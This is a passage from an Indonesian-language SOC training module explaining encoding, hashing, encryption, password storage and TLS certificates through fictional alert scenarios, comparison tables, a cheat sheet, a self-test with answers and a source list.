| Password hashing scheme dengan salt unik dan cost factor | `$pbkdf2-sha256$i=600000$<salt>$<hash>` | Penyerang harus menebak satu per satu, dan setiap tebakan sengaja dibuat mahal | Sesuai NIST SP 800-63B-4 [S11] |

Contoh baris ketiga, dihitung dengan PBKDF2-HMAC-SHA256 600.000 iterasi untuk password `Rahasia123` dengan dua salt acak 16 byte (32 karakter heksadesimal) yang berbeda:

```
pelanggan A  salt 9f2c4e71a0b85d36c1e47a29f0d3b812
             hash bbd69b6f287e60384c6239de1fdcc90b80b94037a53c4a1175a9cccc6996a036
pelanggan B  salt 3a7d10c5e9f24b68a1d0c77e52b9f403
             hash f0294cf0bc494ba081f439635f095fd9a98584c559f7b329a731bfa6079cd0cc
```

Password yang sama menghasilkan hash 64 karakter yang berbeda karena salt-nya berbeda. Salt 16 byte (128 bit) jauh di atas batas minimum 32 bit NIST [S11].

**Jawaban yang dikirim:** password pelanggan tidak boleh disimpan dengan enkripsi yang bisa dibalik. Di versi baru, simpan dengan password hashing scheme yang dianjurkan (Argon2id, atau PBKDF2-HMAC-SHA256 bila wajib memakai algoritma yang disetujui FIPS), dengan salt acak unik per pelanggan dan cost factor setinggi yang masih nyaman untuk login [S11][S13]. Simpan nama scheme dan cost factor di samping hash. Karena password asli tidak tersimpan, migrasi dilakukan saat pelanggan login berikutnya: password yang diketik diverifikasi dengan cara lama, lalu langsung di-hash dengan cara baru. Setelah migrasi selesai, data terenkripsi lama dan kunci AES-nya dihapus. Pertimbangkan juga pepper yang kuncinya disimpan di luar server portal [S11].

**Kapan gagal:** hashing yang benar tidak melindungi password yang lemah atau yang sudah bocor di situs lain. Pelanggan dengan password `Rahasia123` tetap bisa dibobol lewat tebakan langsung di halaman login, seperti pada alert credential stuffing di Day 01. Penyimpanan password dan batas percobaan login adalah dua control yang berbeda.

### 2.4 Membaca sertifikat `portal.jab.example` dan alert `SOC-2027-0832`

Ini alert ketiga, dari pemantauan sertifikat di SIEM, beserta ringkasan isi sertifikat yang dipasang di `jkt-waf01`.

```
Alert        : SOC-2027-0832   TLS certificate expiring soon
Waktu        : 2027-08-06 07:00:00 WIB
Target       : portal.jab.example:443 (203.0.113.8), dilayani jkt-waf01
Sisa waktu   : 14 hari

Ringkasan sertifikat:
  Version              : 3
  Serial number        : 04:7a:1c:9e:52:b0:3d:88:61:f2
  Signature algorithm  : sha256WithRSAEncryption
  Issuer               : CN=Contoh Public TLS CA R7, O=Contoh Trust
  Validity
    Not Before         : 2027-05-12 08:00:00 UTC
    Not After          : 2027-08-20 07:59:59 UTC
  Subject              : CN=portal.jab.example
  Subject Alt Name     : DNS:portal.jab.example
  Public key           : RSA 2048 bit
  Basic constraints    : CA:FALSE
  Extended key usage   : TLS Web Server Authentication
  SHA-256 fingerprint  : d2bf51eefe876999aabe91f86eb445ac3303c99fcd78e89893b4a1a827c5b8f7

Rantai:
  [0] CN=portal.jab.example          diterbitkan oleh  Contoh Public TLS CA R7
  [1] CN=Contoh Public TLS CA R7     diterbitkan oleh  Contoh Root CA X1
  [2] CN=Contoh Root CA X1           ada di trust store browser
```

Nama CA di contoh ini fiktif. Fingerprint SHA-256 dihitung dari teks contoh `portal.jab.example sertifikat 2027-05-12`; di dunia nyata fingerprint adalah hash SHA-256 seluruh isi sertifikat dan dipakai untuk mengenali sertifikat secara unik, sama seperti hash file.

**Cara membaca:**

- **Validity:** dari 2027-05-12 08:00:00 UTC sampai 2027-08-20 07:59:59 UTC adalah 100 hari, batas maksimum yang berlaku sejak 15 Maret 2027 [S25][S26]. Dalam WIB (UTC+7), sertifikat habis Jumat 2027-08-20 pukul 14:59:59. Dari pagi 2027-08-06 ke 2027-08-20 tersisa 14 hari, sesuai alert.
- **Subject dan SAN:** hanya `portal.jab.example`. Bila suatu hari portal juga dilayani di nama lain, nama itu harus masuk SAN, atau browser akan menolaknya.
- **Signature algorithm:** SHA-256 dengan RSA, bukan MD5 atau SHA-1 (bagian 1.2).
- **Basic constraints `CA:FALSE`:** sertifikat ini milik situs, bukan CA, sehingga tidak bisa dipakai untuk menerbitkan sertifikat lain (bagian 1.6).
- **Rantai:** tiga tingkat, root ada di trust store, jadi semua browser pelanggan memercayainya selama masih berlaku (bagian 1.7).

**Keputusan:** tiket ke tim Agung Prabowo dengan tenggat sebelum 2027-08-20, dengan tiga catatan: sertifikat baru harus dipasang di `jkt-waf01` (titik akhir TLS pelanggan, bagian 1.9); private key baru dibuat di perangkat itu dan tidak dikirim lewat email atau chat; dan perpanjangan berikutnya diotomatisasi karena masa berlaku akan turun lagi menjadi 47 hari pada Maret 2029 [S25][S26]. Alert pemantauan tetap aktif sebagai control detective bila otomatisasi gagal.

**Bila tidak ditindaklanjuti:** mulai 2027-08-20 pukul 15:00 WIB, browser pelanggan menampilkan peringatan penuh dan menolak memuat portal (bagian 1.10). Itu gangguan availability yang sepenuhnya bisa dicegah.

## 3. Perbandingan istilah yang sering tertukar

### 3.1 Encoding vs hashing vs encryption

Tiga istilah ini adalah inti Day ini. Tabel berikut membedakannya dengan pertanyaan yang sama; cari kolom "Bisa dibalik" saat ragu menamai sebuah string acak.

| Aspek | Encoding | Hashing | Encryption |
|---|---|---|---|
| Tujuan | Mengubah format supaya bisa dikirim atau disimpan | Sidik jari, cek keutuhan, simpan password | Kerahasiaan |
| Butuh kunci | Tidak | Tidak (kecuali varian berkunci seperti HMAC) | Ya |
| Bisa dibalik | Ya, oleh siapa pun | Tidak | Ya, hanya pemegang kunci |
| Panjang keluaran | Bergantung masukan (Base64 sekitar 4/3 kali) | Tetap (MD5 32, SHA-1 40, SHA-256 64 karakter heks) | Bergantung masukan |
| Contoh | Base64, hex, URL encoding | MD5, SHA-1, SHA-256, Argon2id | AES, RSA, TLS |
| Di alert SOC | `-EncodedCommand`, data di URL | Hash file, hash password | Lalu lintas HTTPS, file ransomware |
| Salah sebut yang umum | "Dienkripsi Base64" | "Didekripsi dari hash" | "Di-encode AES" |

### 3.2 MD5 vs SHA-1 vs SHA-256

Ketiga hash ini akan terus muncul bersamaan di alert EDR dan laporan intelijen. Tabel berikut membantu memutuskan mana yang dipakai untuk apa.

| Aspek | MD5 | SHA-1 | SHA-256 |
|---|---|---|---|
| Panjang | 128 bit, 32 karakter | 160 bit, 40 karakter | 256 bit, 64 karakter |
| Collision praktis | Ya, dalam hitungan detik [S8] | Ya, sejak 2017 [S9] | Tidak diketahui |
| Untuk digital signature | Tidak boleh [S8] | Dipensiunkan NIST [S10] | Ya |
| Untuk mengenali file di reputasi | Masih dipakai sumber lama | Masih dipakai sumber lama | Pilihan utama |
| Untuk allowlist atau bukti | Jangan | Jangan | Ya |
| Untuk password | Jangan | Jangan | Jangan langsung; pakai password hashing scheme |

### 3.3 Symmetric vs asymmetric

Dua jenis enkripsi ini saling melengkapi, bukan saling menggantikan. Cari kolom "Dipakai untuk" untuk mengingat kenapa sistem nyata memakai keduanya.

| Aspek | Symmetric | Asymmetric |
|---|---|---|
| Jumlah kunci | Satu, dipegang bersama | Sepasang: public dan private |
| Yang dirahasiakan | Kunci bersama | Hanya private key |
| Kecepatan | Cepat | Lambat |
| Dipakai untuk | Mengenkripsi data dalam jumlah besar (isi HTTPS, disk, kolom database) | Identitas, digital signature, membantu menyepakati kunci |
| Contoh | AES-128, AES-256 [S14] | RSA, ECC |
| Masalah utama | Bagaimana membagikan kunci dengan aman | Bagaimana memastikan public key milik orang yang benar |
| Penyelesaian masalahnya | Key exchange (bagian 1.8) | Certificate dan PKI (bagian 1.6, 1.7) |

### 3.4 Encryption vs digital signature vs certificate

Ketiganya memakai pasangan kunci yang sama, sehingga sering dianggap satu hal. Tabel berikut memisahkannya berdasarkan pertanyaan yang dijawab.

| Aspek | Encryption | Digital signature | Certificate |
|---|---|---|---|
| Pertanyaan yang dijawab | Siapa yang boleh membaca? | Siapa pembuatnya, dan apakah berubah? | Public key ini milik siapa? |
| Sifat yang dijaga | Confidentiality | Integrity, authenticity, non-repudiation | Kepercayaan pada public key |
| Kunci yang dipakai | Public key penerima (asymmetric) atau kunci bersama (symmetric) | Private key penandatangan; diverifikasi dengan public key | Ditandatangani private key CA |
| Menyembunyikan isi | Ya | Tidak [S16] | Tidak; sertifikat bersifat publik |
| Contoh di PT JAB | Isi HTTPS portal, kolom NIK | Tanda tangan kode, CertificateVerify di TLS | Sertifikat `portal.jab.example` |

## 4. Salah paham umum

Butir berikut adalah salah paham yang melintasi beberapa istilah sekaligus. Salah paham yang khusus satu istilah sudah ditulis di subbagiannya.

- **Anggapan:** semua string yang tidak terbaca berarti terenkripsi. **Kenyataannya:** sebagian besar string acak di alert adalah encoding (Base64, hex) atau hash. Encoding bisa dibalik siapa pun tanpa kunci [S1], dan hash tidak bisa dibalik sama sekali. Uji pertama selalu: coba decode (bagian 1.1 dan 2.1).
- **Anggapan:** enkripsi adalah cara paling aman menyimpan password. **Kenyataannya:** password disimpan dengan password hashing scheme yang lambat dan bersalt, bukan dienkripsi, karena sistem tidak perlu tahu password aslinya, hanya perlu mencocokkan [S11][S13] (bagian 1.3 dan 2.3).
- **Anggapan:** data yang sudah dienkripsi pasti aman. **Kenyataannya:** keamanan enkripsi bergantung pada kunci. Kunci yang disimpan di samping data, private key yang dikirim lewat email, atau kunci yang diambil malware dari memori membuat enkripsi terkuat pun tidak berarti (bagian 1.3 dan 1.4).
- **Anggapan:** gembok HTTPS berarti situsnya aman dan milik organisasi yang sah. **Kenyataannya:** gembok berarti sambungan terenkripsi dan sertifikat valid untuk nama domain itu. CA hanya memastikan penguasaan domain, bukan niat pemiliknya, jadi situs phishing di domain miliknya sendiri juga bergembok (bagian 1.6 dan 1.10).
- **Anggapan:** HTTPS menyembunyikan semua yang dilakukan user dari jaringan. **Kenyataannya:** isi permintaan memang terenkripsi, tetapi IP tujuan, waktu, volume, dan nama situs di SNI masih terlihat di jalur pada TLS biasa [S20]. Selain itu, perangkat yang dipercaya laptop lewat PKI internal, seperti `jkt-proxy01`, bisa membuka isinya (bagian 1.7 dan 1.9).
- **Anggapan:** semakin panjang hash, semakin "terenkripsi" datanya. **Kenyataannya:** panjang hash hanya bergantung pada algoritmanya (32, 40, atau 64 karakter heks), bukan pada isi atau tingkat kerahasiaan. Hash tidak mengenkripsi apa pun (bagian 1.2).
- **Anggapan:** bila private key server bocor, cukup ganti password admin. **Kenyataannya:** private key yang bocor memungkinkan penyamaran sebagai server. Sertifikatnya harus dicabut dan diganti dengan pasangan kunci baru. Forward secrecy di TLS 1.3 melindungi rekaman lama [S20], tetapi tidak mencegah penyamaran ke depan (bagian 1.6 dan 1.8).

## 5. Catatan terkini

Bagian ini mencatat versi standar, tanggal pensiun algoritma, dan perubahan aturan sertifikat yang perlu diketahui saat membaca sumber lain.

- **SHA-1 dipensiunkan NIST.** Pengumuman 15 Desember 2022 menyatakan SHA-1 sudah mencapai akhir masa pakainya, menganjurkan peralihan ke SHA-2 atau SHA-3 secepat mungkin, dan menetapkan batas penghapusan 31 Desember 2030 [S10]. NIST berencana menerbitkan FIPS 180-5 tanpa SHA-1 dan merevisi SP 800-131A sebelum batas itu [S10]. Halaman FIPS 180-4 (versi Agustus 2015) mencatat keputusan NIST untuk merevisi standar itu pada Maret 2023 [S6]. Cek apakah FIPS 180-5 sudah terbit saat kamu membaca ini.
- **NIST SP 800-63B-4** terbit final Juli 2025 dan menggantikan SP 800-63B versi 2017 (pembaruan Maret 2020) [S11]. Aturan salt minimal 32 bit dan kewajiban password hashing scheme ada di bagian Password Verifiers [S11].
- **FIPS 197 (AES)** pertama terbit November 2001 dan diperbarui 9 Mei 2023 tanpa perubahan teknis pada algoritmanya, hanya perbaikan penulisan [S14].
- **TLS 1.3 (RFC 8446)** terbit Agustus 2018 dan menggantikan TLS 1.2 (RFC 5246) [S20]. TLS 1.0 dan 1.1 resmi tidak boleh dipakai lagi sejak RFC 8996 (Maret 2021) [S22]; MDN mencatat TLS 1.3 sebagai versi saat ini yang paling banyak dipakai dan TLS 1.2 masih dipakai sebagian situs [S21].
- **Encrypted Client Hello (ECH, RFC 9849)** terbit Maret 2026 sebagai standar IETF. ECH mengenkripsi ClientHello bagian dalam, termasuk SNI, dan hanya menampilkan nama server publik yang umum di ClientHello luar [S23]. RFC itu sendiri mengingatkan bahwa query DNS tanpa enkripsi dan IP server yang terlihat masih bisa membocorkan tujuan [S23]. Bila ECH dipakai luas, nama situs di log jaringan (Day 02) akan makin jarang tersedia; cek dukungan browser dan perangkat di lingkunganmu.
- **Masa berlaku sertifikat TLS publik.** CA/Browser Forum Ballot SC-081v3 disetujui 11 April 2025: 25 CA setuju, 0 menolak, 5 abstain, dan keempat pembuat browser besar setuju [S24]. Masa berlaku maksimum turun dari 398 hari ke 200 hari (15 Maret 2026), 100 hari (15 Maret 2027), dan 47 hari (15 Maret 2029) [S25][S26]. Ballot yang sama memperpendek masa pakai ulang hasil validasi domain sampai 10 hari [S24]; sumber sekunder berbeda soal tanggal tahap ini, jadi cek teks Baseline Requirements terbaru bila perlu angka pastinya.
- **Kriptografi post-quantum.** Pada 13 Agustus 2024 NIST menerbitkan tiga standar pertama: FIPS 203 (ML-KEM, untuk menyepakati kunci), FIPS 204 (ML-DSA, digital signature utama), dan FIPS 205 (SLH-DSA, digital signature cadangan berbasis hash) [S27]. Alasannya, komputer kuantum yang cukup kuat diperkirakan bisa memecahkan public key cryptography yang dipakai sekarang (RSA, ECC), dan NIST mendorong peralihan dimulai sekarang karena butuh waktu [S27]. Symmetric encryption seperti AES dan hash seperti SHA-256 tidak termasuk yang digantikan standar ini. Di level fondasi, cukup ingat: ke depan, sertifikat dan key exchange akan mulai memakai algoritma baru ini.

## 6. Cheat sheet

```
ENCODING        ubah format, tanpa kunci, dibalik siapa pun (Base64, hex, URL)
BASE64          A-Z a-z 0-9 + / dan pengisi =; 3 byte -> 4 karakter; base64url pakai - dan _
                "Halo" -> SGFsbw==   "jab" -> amFi   tidak memberi kerahasiaan
-EncodedCommand PowerShell menerima Base64 dari teks UTF-16LE; banyak "A" = ciri UTF-16LE
HASH            sidik jari panjang tetap; one-way; collision resistant; 1 karakter beda = hash beda total
MD5             128 bit = 32 heks; collision dalam detik; jangan untuk signature/allowlist
SHA-1           160 bit = 40 heks; collision 2017; dipensiunkan NIST, batas akhir 2030-12-31
SHA-256         256 bit = 64 heks; pakai untuk reputasi, tiket, blocklist, bukti
COLLISION       dua data berbeda, hash sama
SALT            acak, unik per akun, tidak rahasia, disimpan di samping hash; min 32 bit (NIST)
PASSWORD        hash dengan scheme lambat + salt + cost factor (Argon2id, PBKDF2 600.000 iterasi)
                bukan enkripsi; bukan SHA-256 polos
SYMMETRIC       satu kunci bersama; cepat; AES-128/192/256, blok 128 bit
ASYMMETRIC      public key (dibagikan) + private key (dirahasiakan); lambat; RSA, ECC
DIGITAL SIGN.   hash ditandatangani private key; dicek dengan public key;
                beri integrity, authenticity, non-repudiation; TIDAK beri kerahasiaan
CERTIFICATE     public key + nama (SAN) + masa berlaku + tanda tangan CA (X.509, RFC 5280)
CA              pihak tepercaya penerbit dan pencabut sertifikat
PKI             seluruh sistem: CA, aturan, trust store, pencabutan (CRL, OCSP)
RANTAI          sertifikat situs <- intermediate CA <- root CA (di trust store)
MASA BERLAKU    maks 200 hari (2026-03-15), 100 hari (2027-03-15), 47 hari (2029-03-15)
KEY EXCHANGE    (EC)DHE: sepakat kunci tanpa mengirim kunci; ephemeral = forward secrecy
TLS 1.3         RFC 8446; ClientHello (SNI terbuka) -> ServerHello -> sisanya terenkripsi; 1-RTT
HTTPS           HTTP di dalam TLS, TCP 443; gembok = sambungan aman, BUKAN situs baik
KEDALUWARSA     browser menolak sertifikat lewat notAfter -> portal tidak bisa dibuka (availability)
POST-QUANTUM    FIPS 203 ML-KEM, 204 ML-DSA, 205 SLH-DSA (Agustus 2024)
```

## 7. Uji diri

Coba jawab dulu tanpa membuka bagian di atas. Bila jawabanmu berbeda dengan kunci, baca ulang bagian yang disebut di kunci.

**1. Pertanyaan jebakan.** "Perintah PowerShell di alert memakai `-EncodedCommand` dengan string panjang berakhiran `==`, jadi isinya terenkripsi dan analyst L1 tidak bisa membacanya tanpa bantuan tim forensik." Benarkah?

<details><summary>Jawaban</summary>

Tidak. `-EncodedCommand` menerima perintah dalam Base64, dan Base64 adalah encoding, bukan enkripsi: aturannya publik, tidak ada kunci, dan siapa pun bisa membaliknya. Tanda `==` adalah pengisi Base64, dan pola banyak huruf `A` menunjukkan teks UTF-16LE. Di `SOC-2027-0830`, hasil decode-nya adalah perintah unduhan dari `192.0.2.121`. Standar Base64 sendiri menegaskan encoding ini tidak memberi kerahasiaan. Lihat bagian 1.1 dan 2.1.

</details>

**2. Skenario keputusan.** Tim aplikasi portal harus memilih cara menyimpan password pelanggan di versi baru. Mana yang paling tepat?

- A. Enkripsi AES-256, dengan kunci disimpan di file konfigurasi yang dibatasi aksesnya.
- B. Hash SHA-256 tanpa salt, karena SHA-256 belum pernah dibobol collision-nya.
- C. Password hashing scheme seperti Argon2id atau PBKDF2-HMAC-SHA256 dengan salt acak unik per pelanggan dan cost factor setinggi yang masih nyaman untuk login.

<details><summary>Jawaban</summary>

C. NIST SP 800-63B-4 mewajibkan password disimpan salted dan hashed dengan password hashing scheme yang memakai salt minimal 32 bit dan cost factor. A keliru karena enkripsi bisa dibalik: bila database dan kunci sama-sama dicuri, semua password terbuka dalam bentuk asli, padahal portal tidak pernah perlu tahu password asli. B keliru karena SHA-256 dirancang cepat sehingga menguntungkan penebak, dan tanpa salt password yang sama menghasilkan hash yang sama dan bisa dicocokkan dengan tabel siap pakai. Masalah B bukan collision, melainkan kecepatan dan ketiadaan salt. Lihat bagian 1.3 dan 2.3.

</details>

**3. Pertanyaan jebakan.** "SHA-256 file `u.ps1` tidak dikenal di layanan reputasi mana pun, jadi file itu bersih dan karantinanya bisa dilepas." Benarkah?

<details><summary>Jawaban</summary>

Tidak. Hash hanya identitas file, bukan penilaian. Hash yang belum pernah terlihat bisa berarti file dibuat khusus untuk sasaran ini, atau diubah satu karakter supaya hash-nya baru. Petunjuk lain di alert justru menunjuk bahaya: file tidak bertanda tangan, diunduh dari IP luar lewat perintah PowerShell tersembunyi, dan disimpan di folder sementara. Lihat bagian 1.2, 1.5, dan 2.2.

</details>

**4. Skenario keputusan.** Alert `SOC-2027-0832` menyebut sertifikat `portal.jab.example` kedaluwarsa 14 hari lagi. Seorang rekan berkata, "Tidak usah buru-buru; kalau kedaluwarsa, pelanggan cuma dapat peringatan dan bisa klik lanjutkan." Tanggapan mana yang paling tepat?

- A. Setuju, karena enkripsinya tetap berjalan walaupun sertifikat kedaluwarsa.
- B. Buat tiket ke tim infrastruktur dengan tenggat sebelum tanggal kedaluwarsa, pasang sertifikat baru di titik akhir TLS (`jkt-waf01`), dan minta perpanjangan berikutnya diotomatisasi.
- C. Ganti sementara dengan sertifikat self-signed supaya tidak bergantung pada CA.

<details><summary>Jawaban</summary>

B. Sertifikat yang lewat `notAfter` gagal diperiksa browser, sehingga portal ditolak dimuat dan pelanggan tidak bisa membayar, yaitu gangguan availability. Masa berlaku 100 hari (dan 47 hari mulai 2029) membuat perpanjangan manual mudah terlewat, jadi otomatisasi adalah perbaikan sebenarnya. A keliru karena melatih pelanggan mengabaikan peringatan sertifikat, kebiasaan yang dimanfaatkan penyamar, dan banyak aplikasi langsung gagal tanpa pilihan lanjut. C keliru karena sertifikat self-signed tidak dipercaya browser pelanggan dan menimbulkan peringatan yang sama. Lihat bagian 1.6, 1.7, 1.10, dan 2.4.

</details>

**5. Jelaskan ulang.** Jelaskan kepada anggota keluargamu yang bukan orang IT, dalam tiga kalimat, apa arti ikon gembok di browser saat membuka situs bank, dan apa yang tidak dijamin gembok itu.

<details><summary>Contoh jawaban dan kesalahan yang sering muncul</summary>

Contoh: "Gembok itu artinya obrolan antara HP-mu dan situs itu dibungkus sandi, jadi orang yang menyadap di Wi-Fi umum tidak bisa membaca atau mengubah isinya. Gembok juga berarti situs itu menunjukkan semacam KTP digital yang sah untuk alamat yang kamu ketik. Tapi gembok tidak menjamin pemilik situsnya orang baik, jadi tetap periksa alamatnya benar-benar alamat resmi bank, karena situs penipu pun bisa punya gembok."

Kesalahan yang sering muncul:
- Mengatakan gembok berarti "situsnya aman", tanpa membedakan sambungan yang aman dari pemilik yang jujur.
- Memakai istilah teknis tanpa penjelasan (TLS, sertifikat, CA, enkripsi) kepada orang yang bukan orang IT.
- Lupa memberi tindakan praktis: periksa nama situs di alamat browser.

</details>

**6. Pertanyaan jebakan.** "Kontrak layanan korporat yang ditandatangani dengan digital signature otomatis terenkripsi, jadi aman dikirim lewat email biasa tanpa pengamanan lain." Benarkah?

<details><summary>Jawaban</summary>

Tidak. Digital signature memberi bukti asal-usul, keutuhan, dan non-repudiation, tetapi tidak memberi kerahasiaan; siapa pun yang mendapat dokumen itu tetap bisa membacanya. Bila isi kontrak rahasia, dokumen perlu dienkripsi juga, misalnya dengan public key penerima atau lewat saluran terenkripsi. Tanda tangan dan enkripsi adalah dua fungsi berbeda yang memakai kunci ke arah berbeda: tanda tangan memakai private key pengirim, enkripsi memakai public key penerima. Lihat bagian 1.4, 1.5, dan 3.4.

</details>

**7. Interview question (English).** "What is the difference between encoding, hashing, and encryption? Give a security example of each."

<details><summary>Sample answer</summary>

"They answer three different questions. Encoding changes the format of data so it can be transported or stored, using a public scheme with no key, so anyone can reverse it. Base64 is the classic example, and in a SOC we see it constantly in PowerShell's -EncodedCommand: an analyst who calls that 'encrypted' is wrong, because you can decode it in a second and read the download command inside. Hashing produces a fixed-length fingerprint that cannot be reversed; even a one-character change gives a completely different value. We use SHA-256 to identify files for reputation lookups and blocklists, and we avoid MD5 and SHA-1 for security decisions because practical collisions exist. Hashing is also how passwords should be stored, but with a slow, salted password hashing scheme such as Argon2id or PBKDF2, not plain SHA-256. Encryption is about confidentiality: it is reversible, but only with the right key. TLS is the everyday example: certificates and a key exchange establish a session key, then symmetric encryption such as AES protects the traffic. A quick test I use: if reversing it needs no secret, it's encoding; if it needs a key, it's encryption; if it can't be reversed at all, it's a hash."

What makes this answer strong: it frames the three terms by purpose and reversibility, ties each to something a SOC analyst actually handles (encoded PowerShell, file hashes, TLS), shows awareness of current guidance on MD5, SHA-1, and password storage, and ends with a simple test the interviewer can remember.

</details>

## 8. Sumber

| ID | Judul | URL | Tipe | Terbit/diakses | Keandalan dan catatan |
|---|---|---|---|---|---|
| S1 | RFC 4648: The Base16, Base32, and Base64 Data Encodings | https://www.rfc-editor.org/rfc/rfc4648.html | primer (standar IETF) | Oktober 2006; diakses 2026-10-21 | Tinggi. Alfabet, 3 byte jadi 4 karakter, pengisi `=`, base64url, Base64 tidak memberi kerahasiaan |
| S2 | RFC 7617: The 'Basic' HTTP Authentication Scheme | https://www.rfc-editor.org/rfc/rfc7617.html | primer (standar IETF) | September 2015; diakses 2026-10-21 | Tinggi. `user-id:password` dalam Base64, praktis teks terbuka, wajib di dalam TLS |
| S3 | Microsoft Learn: about_Pwsh (PowerShell 7.6) | https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh | primer (dokumentasi vendor) | ms.date 2026-01-18; diakses 2026-10-21 | Tinggi. `-EncodedCommand` menerima Base64 dari teks UTF-16LE; alias `-e`, `-ec`. Windows PowerShell 5.1 punya parameter yang sama di about_PowerShell_exe |
| S4 | MITRE ATT&CK T1027.010: Obfuscated Files or Information: Command Obfuscation | https://attack.mitre.org/techniques/T1027/010/ | primer (basis pengetahuan MITRE) | versi 2.0, diubah 2026-05-12; diakses 2026-10-21 | Tinggi. Base64 sebagai obfuscation umum; kelompok yang memakai PowerShell ber-Base64 |
| S5 | NIST CSRC Glossary: hash function | https://csrc.nist.gov/glossary/term/hash_function | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi. Keluaran panjang tetap, one-way, collision resistant, second preimage |
| S6 | NIST FIPS 180-4: Secure Hash Standard (SHS) | https://csrc.nist.gov/pubs/fips/180-4/upd1/final<br>https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf | primer (standar NIST) | Agustus 2015; diakses 2026-10-21 | Tinggi. SHA-1 dan keluarga SHA-2, digest 160 sampai 512 bit, perubahan kecil menghasilkan digest berbeda; catatan rencana revisi Maret 2023 |
| S7 | RFC 1321: The MD5 Message-Digest Algorithm | https://www.rfc-editor.org/rfc/rfc1321.html | primer (RFC Informational) | April 1992; diakses 2026-10-21 | Tinggi. Digest 128 bit |
| S8 | RFC 6151: Updated Security Considerations for the MD5 Message-Digest and the HMAC-MD5 Algorithms | https://www.rfc-editor.org/rfc/rfc6151.html | primer (RFC Informational) | Maret 2011; diakses 2026-10-21 | Tinggi. Collision MD5 dalam hitungan detik sampai satu menit; tidak boleh untuk digital signature |
| S9 | SHAttered (CWI Amsterdam dan Google) | https://shattered.io/ | primer (situs tim peneliti) | 2017-02-23; diakses 2026-10-21 | Tinggi. Dua PDF berbeda dengan SHA-1 sama; sekitar 6.500 tahun CPU dan 110 tahun GPU |
| S10 | NIST: NIST Retires SHA-1 Cryptographic Algorithm | https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm | primer (pengumuman NIST) | 2022-12-15, diperbarui 2026-04-08; diakses 2026-10-21 | Tinggi. Batas 31 Desember 2030, beralih ke SHA-2/SHA-3, rencana FIPS 180-5 dan revisi SP 800-131A |
| S11 | NIST SP 800-63B-4: Digital Identity Guidelines, Authentication and Authenticator Management | https://pages.nist.gov/800-63-4/sp800-63b.html<br>https://csrc.nist.gov/pubs/sp/800/63/b/4/final | primer | Juli 2025; diakses 2026-10-21 | Tinggi. Password salted and hashed, salt minimal 32 bit, cost factor, langkah hash berkunci tambahan, simpan keterangan scheme |
| S12 | NIST CSRC Glossary: salt | https://csrc.nist.gov/glossary/term/salt | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi. Definisi umum dari SP 800-63-4 |
| S13 | OWASP Password Storage Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html | sekunder (panduan komunitas OWASP) | diakses 2026-10-21 | Sedang-tinggi. Hash vs enkripsi untuk password, fungsi salt, pepper, Argon2id/scrypt/bcrypt/PBKDF2 600.000 iterasi, hash cepat tidak cocok |
| S14 | NIST FIPS 197: Advanced Encryption Standard (AES) | https://csrc.nist.gov/pubs/fips/197/final | primer (standar NIST) | 2001-11-26, diperbarui 2023-05-09; diakses 2026-10-21 | Tinggi. Blok 128 bit, kunci 128/192/256 bit; pembaruan 2023 tanpa perubahan teknis |
| S15 | NIST CSRC Glossary: asymmetric cryptography | https://csrc.nist.gov/glossary/term/asymmetric_cryptography | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi. Dua kunci terpisah: enkripsi/tanda tangan dan dekripsi/verifikasi |
| S16 | NIST CSRC Glossary: digital signature | https://csrc.nist.gov/glossary/term/digital_signature | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi. Origin authentication, integrity, non-repudiation; private key menandatangani, public key memverifikasi; tidak memberi kerahasiaan (definisi SP 800-63-4) |
| S17 | RFC 5280: Internet X.509 Public Key Infrastructure Certificate and CRL Profile | https://www.rfc-editor.org/rfc/rfc5280.html | primer (standar IETF) | Mei 2008; diakses 2026-10-21 | Tinggi. Isi sertifikat, ekstensi, certification path ke trust anchor, CRL, OCSP sebagai alternatif |
| S18 | NIST CSRC Glossary: certificate authority | https://csrc.nist.gov/glossary/term/certificate_authority | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi |
| S19 | NIST CSRC Glossary: public key infrastructure | https://csrc.nist.gov/glossary/term/public_key_infrastructure | primer (glosarium NIST) | diakses 2026-10-21 | Tinggi. Kerangka penerbitan, pemeliharaan, pencabutan; kebijakan, proses, server, orang |
| S20 | RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3 | https://www.rfc-editor.org/rfc/rfc8446.html | primer (standar IETF) | Agustus 2018; diakses 2026-10-21 | Tinggi. Tiga sifat keamanan, alur handshake, 1-RTT, pesan setelah ServerHello terenkripsi, static RSA dihapus, forward secrecy |
| S21 | MDN Web Docs: Transport Layer Security (TLS) | https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security | sekunder (dokumentasi Mozilla) | diakses 2026-10-21 | Sedang-tinggi. Tiga perlindungan TLS, isi handshake secara umum, status versi |
| S22 | RFC 8996: Deprecating TLS 1.0 and TLS 1.1 | https://www.rfc-editor.org/rfc/rfc8996.html | primer (BCP 195) | Maret 2021; diakses 2026-10-21 | Tinggi |
| S23 | RFC 9849: TLS Encrypted Client Hello | https://www.rfc-editor.org/rfc/rfc9849.html | primer (standar IETF) | Maret 2026; diakses 2026-10-21 | Tinggi. Enkripsi ClientHello dalam termasuk SNI; DNS dan IP masih bisa membocorkan tujuan |
| S24 | CA/Browser Forum: Ballot SC081v3, Introduce Schedule of Reducing Validity and Data Reuse Periods | https://cabforum.org/2025/04/11/ballot-sc081v3-introduce-schedule-of-reducing-validity-and-data-reuse-periods/ | primer (CA/Browser Forum) | 2025-04-11; diakses 2026-10-21 | Tinggi. 398 ke 47 hari antara Maret 2026 dan Maret 2029; hasil pemungutan suara. Halaman ringkasan tidak memuat tanggal per tahap |
| S25 | AppViewX: CA/Browser Forum and 47 Days, Everything you need to know | https://www.appviewx.com/blogs/its-official-ca-b-forum-votes-yes-to-47-day-tls-certificates/ | sekunder (blog vendor) | diakses 2026-10-21 | Sedang. Tahap 200 hari (Maret 2026), 100 hari (Maret 2027), 47 hari (Maret 2029) |
